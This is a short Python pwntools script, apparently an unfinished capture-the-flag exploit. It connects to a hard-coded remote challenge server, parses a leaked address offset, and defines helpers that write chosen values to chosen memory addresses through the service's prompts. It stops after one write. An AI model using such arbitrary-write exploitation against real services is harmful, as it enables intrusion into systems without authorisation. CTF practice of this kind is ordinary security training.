'''
Created on Mar 22, 2019

@author: sherl
'''
from pwn import *
import base64,os
import libnum

#os.environ["TERM"] = 'linux'
#os.environ["TERMINFO"] = '/etc/terminfo'

p = remote("101.201.66.182",4333)
offset=0

def write2addr(addr, data):
    #print ( p.recvuntil(':') )
    p.sendafter("Eye  >", hex(addr)[2:]+'\n')
    print ('addr:'+hex(addr)[2:])
    

    p.sendafter("Tear >",str(data)+'\n')
    print ('data:'+str(data)+'\n')



def tozero():
    write2addr (offset +12, 0)


def writerorwx(rela_addr, data):
    write2addr(0x40480b4+rela_addr, data)


p.recvuntil("Your relative:")
tep=p.recvline(keepends=False).strip()
print( tep )
offset=int(tep, 16)

print (hex(offset))


tozero()